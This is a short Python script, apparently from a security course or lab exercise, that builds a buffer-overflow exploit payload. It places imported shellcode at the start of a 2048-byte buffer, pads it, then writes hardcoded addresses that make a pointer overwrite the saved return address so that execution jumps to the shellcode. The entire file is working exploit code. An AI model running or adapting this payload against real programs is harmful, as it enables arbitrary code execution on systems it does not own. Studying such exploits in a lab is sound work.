#!/usr/bin/env python3

import sys

from shellcode import shellcode


# We need to:
# 1. Place shellcode in the buffer
# 2. Manipulate p and a to overwrite a critical memory location
# 3. Place a return address that points to our shellcode

# First, let's add our shellcode at the start of the buffer
payload = shellcode

# Pad until we reach the pointer p and value a
# The buffer is 2048 bytes, and we want to align properly to manipulate p
pad_length = 2048 - len(shellcode)
payload += b'A' * pad_length

# Now we need to set up p to point to the return address location
# and set a to be the address of our shellcode

# The return address is typically stored at rbp+8
# We'll set p to point to that location
return_addr_ptr = 0x7ffffff68fd8

# Calculate shellcode address (start of buffer)
# You'll need to find the actual buffer address from GDB
shellcode_addr = 0x7ffffff687b0

# Add p (pointing to return address location) and a (containing shellcode address)
payload += return_addr_ptr.to_bytes(8, 'little')  # This is p
payload += shellcode_addr.to_bytes(8, 'little')   # This is a

sys.stdout.buffer.write(payload)